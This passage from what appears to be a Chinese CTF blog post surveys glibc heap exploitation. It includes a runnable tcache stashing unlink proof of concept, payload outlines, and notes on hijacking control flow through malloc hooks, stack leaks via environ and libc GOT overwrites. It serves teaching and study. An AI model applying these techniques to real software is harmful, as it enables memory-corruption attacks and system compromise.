class=\"number\">0</span>)+p64(fake_size)+p64(&amp;ptr-<span class=\"number\">0x18</span>)+p64(&amp;ptr-<span class=\"number\">0x10</span>)+p64(<span class=\"number\">0</span>)*k + p64(fake_prev_size)+p64(size)) <span class=\"comment\"># fakesize = 0x420-0x10</span></span><br><span class=\"line\"><span class=\"comment\"># need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0</span></span><br></pre></td></tr></table></figure>\n<p><strong>限制:</strong></p>\n<ul>\n<li>overflow ,可以修改prev_inuse触发fake chunk  unlink and  consolidate</li>\n<li>主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构</li>\n</ul>\n<p><strong>效果:</strong></p>\n<ul>\n<li>可以将ptr处地址改写为&amp;ptr-8</li>\n</ul>\n<h2 id=\"tcache-stashing-unlink\">tcache stashing unlink</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> stack_var[<span class=\"number\">0x10</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *chunk_lis[<span class=\"number\">0x10</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *target;</span><br><span class=\"line\"></span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This file demonstrates the stashing unlink attack on tcache.\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Stack_var emulates the fake chunk we want to alloc to.\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    stack_var[<span class=\"number\">3</span>] = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)(&amp;stack_var[<span class=\"number\">2</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You can see the value of fake_chunk-&gt;bk is:%p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*)stack_var[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*)stack_var[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we alloc 9 chunks with malloc.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//now we malloc 9 chunks</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">        chunk_lis[i] = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//put 7 chunks into tcache</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">3</span>;i &lt; <span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(chunk_lis[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//last tcache bin</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"comment\">//now they are put into unsorted bin</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">2</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//convert into small bin</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0xa0</span>);<span class=\"comment\">// size &gt; 0x90</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//now 5 tcache bins</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\\n\\n&quot;</span>,(<span class=\"type\">void</span>*)stack_var);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//change victim-&gt;bck</span></span><br><span class=\"line\">    <span class=\"comment\">/*VULNERABILITY*/</span></span><br><span class=\"line\">    chunk_lis[<span class=\"number\">2</span>][<span class=\"number\">1</span>] = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)stack_var;</span><br><span class=\"line\">    <span class=\"comment\">/*VULNERABILITY*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//trigger the attack</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>,<span class=\"number\">0x90</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*)stack_var[<span class=\"number\">2</span>],(<span class=\"type\">void</span>*)stack_var[<span class=\"number\">4</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//malloc and return our fake chunk on stack</span></span><br><span class=\"line\">    target = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);   </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n&quot;</span>,(<span class=\"type\">void</span>*)target);</span><br><span class=\"line\"></span><br><span class=\"line\">    assert(target == &amp;stack_var[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>核心思路:</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">calloc(<span class=\"number\">0xa0</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    calloc(<span class=\"number\">0xa0</span>)</span><br><span class=\"line\">    free(i)</span><br><span class=\"line\">calloc(<span class=\"number\">0x4b0</span>) <span class=\"comment\"># 9 </span></span><br><span class=\"line\">calloc(<span class=\"number\">0xb0</span>) <span class=\"comment\"># 10</span></span><br><span class=\"line\">free(<span class=\"number\">9</span>)</span><br><span class=\"line\">calloc(<span class=\"number\">0x400</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">calloc(<span class=\"number\">0x4b0</span>) <span class=\"comment\"># 11</span></span><br><span class=\"line\">calloc(<span class=\"number\">0xb0</span>) <span class=\"comment\"># 12</span></span><br><span class=\"line\">free(<span class=\"number\">9</span>)</span><br><span class=\"line\">calloc(<span class=\"number\">0x400</span>) <span class=\"comment\">#13</span></span><br><span class=\"line\">edit(<span class=\"number\">13</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x400</span>+p64(prev_size)+p64(size)+p64(target_add-<span class=\"number\">0x10</span>))</span><br><span class=\"line\">calloc(<span class=\"number\">0xa0</span>)</span><br></pre></td></tr></table></figure>\n<p><strong>限制:</strong></p>\n<ul>\n<li>需要UAF</li>\n<li>主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便</li>\n</ul>\n<p><strong>效果:</strong></p>\n<ul>\n<li>获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。</li>\n<li>在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。</li>\n</ul>\n<h2 id=\"tcache-poison\">tcache poison</h2>\n<p>主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。</p>\n<h2 id=\"house-of-origin\">house of origin</h2>\n<p>house of origin 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。</p>\n<p>一般而言，修改top chunk需要满足一下条件。</p>\n<ol>\n<li>伪造的 size 必须要对齐到内存页</li>\n<li>size 要大于 MINSIZE(0x10)</li>\n<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>\n<li>size 的 prev inuse 位必须为 1</li>\n</ol>\n<h1>攻击面</h1>\n<ul>\n<li>劫持控制流\n<ul>\n<li>hooks</li>\n<li>stack</li>\n<li>IO_FILE</li>\n<li>dlts</li>\n<li>libc.got</li>\n</ul>\n</li>\n<li>辅助攻击链\n<ul>\n<li>tcache_perthread_struct</li>\n<li>global_max_fast</li>\n<li>heap 管理结构</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"劫持控制流\">劫持控制流</h2>\n<h3 id=\"hooks\">hooks</h3>\n<p>堆利用中最基本的夺取控制流的方法就是打各种hooks。<br>\n一般而言，可以利用__free_hook 加 写入’/bin/sh’的堆快实现劫持。</p>\n<p>此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件</p>\n<p>而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。</p>\n<h3 id=\"stack\">stack</h3>\n<p>在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。</p>\n<p>我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。</p>\n<p>查看glibc源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !_LIBC</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> __environ\tenviron</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">ifndef</span> HAVE_ENVIRON_DECL</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">char</span> **environ;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>发现这是一个extern变量，在gdb中调试查找</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"number\">0x7f78a14d4000</span>     <span class=\"number\">0x7f78a1500000</span> r--p    <span class=\"number\">2</span>c000      <span class=\"number\">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a1500000</span>     <span class=\"number\">0x7f78a1668000</span> r-xp   <span class=\"number\">168000</span>  <span class=\"number\">2</span>c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a1668000</span>     <span class=\"number\">0x7f78a16bd000</span> r--p    <span class=\"number\">55000</span> <span class=\"number\">194000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16bd000</span>     <span class=\"number\">0x7f78a16be000</span> ---p     <span class=\"number\">1000</span> <span class=\"number\">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16be000</span>     <span class=\"number\">0x7f78a16c1000</span> r--p     <span class=\"number\">3000</span> <span class=\"number\">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16c1000</span>     <span class=\"number\">0x7f78a16c4000</span> rw-p     <span class=\"number\">3000</span> <span class=\"number\">1</span>ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16c4000</span>     <span class=\"number\">0x7f78a16d3000</span> rw-p     f000      <span class=\"number\">0</span> [anon_7f78a16c4]</span><br><span class=\"line\">    <span class=\"number\">0x7f78a16d3000</span>     <span class=\"number\">0x7f78a16d4000</span> r--p     <span class=\"number\">1000</span>      <span class=\"number\">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16d4000</span>     <span class=\"number\">0x7f78a16f8000</span> r-xp    <span class=\"number\">24000</span>   <span class=\"number\">1000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16f8000</span>     <span class=\"number\">0x7f78a1702000</span> r--p     a000  <span class=\"number\">25000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a1702000</span>     <span class=\"number\">0x7f78a1704000</span> r--p     <span class=\"number\">2000</span>  <span class=\"number\">2e000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a1704000</span>     <span class=\"number\">0x7f78a1706000</span> rw-p     <span class=\"number\">2000</span>  <span class=\"number\">30000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7ffd6bb9e000</span>     <span class=\"number\">0x7ffd6bbc0000</span> rw-p    <span class=\"number\">22000</span>      <span class=\"number\">0</span> [<span class=\"built_in\">stack</span>]</span><br><span class=\"line\">    <span class=\"number\">0x7ffd6bbd4000</span>     <span class=\"number\">0x7ffd6bbd8000</span> r--p     <span class=\"number\">4000</span>      <span class=\"number\">0</span> [vvar]</span><br><span class=\"line\">    <span class=\"number\">0x7ffd6bbd8000</span>     <span class=\"number\">0x7ffd6bbda000</span> r-xp     <span class=\"number\">2000</span>      <span class=\"number\">0</span> [vdso]</span><br><span class=\"line\"><span class=\"number\">0xffffffffff600000</span> <span class=\"number\">0xffffffffff601000</span> --xp     <span class=\"number\">1000</span>      <span class=\"number\">0</span> [vsyscall]</span><br><span class=\"line\">pwndbg&gt; p environ</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"type\">char</span> **) <span class=\"number\">0x7ffd6bbbdfc8</span></span><br><span class=\"line\">pwndbg&gt; p &amp;environ</span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"type\">char</span> ***) <span class=\"number\">0x7f78a16c9ec0</span> &lt;environ&gt;</span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证）</p>\n<p>既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。</p>\n<p>此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。</p>\n<h3 id=\"libc-got\">libc.got</h3>\n<p>checksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ checksec libc.so.6       </span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。</p>\n<p>以下的got表来自libc2.34</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000 ; Segment type: Pure data</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000 ; Segment permissions: Read/Write</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000 _got_plt        segment qword public <span class=\"string\">&#x27;DATA&#x27;</span> use64</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000                 assume cs:_got_plt</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000                 ;org <span class=\"number\">1</span>ED000h</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED008 qword_1ED008    dq <span class=\"number\">0</span>                    ; DATA XREF: sub_2C000↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED010 qword_1ED010    dq <span class=\"number\">0</span>                    ; DATA XREF: sub_2C000+<span class=\"number\">6</span>↑r</span><br><span class=\"line\">.got.plt:<span 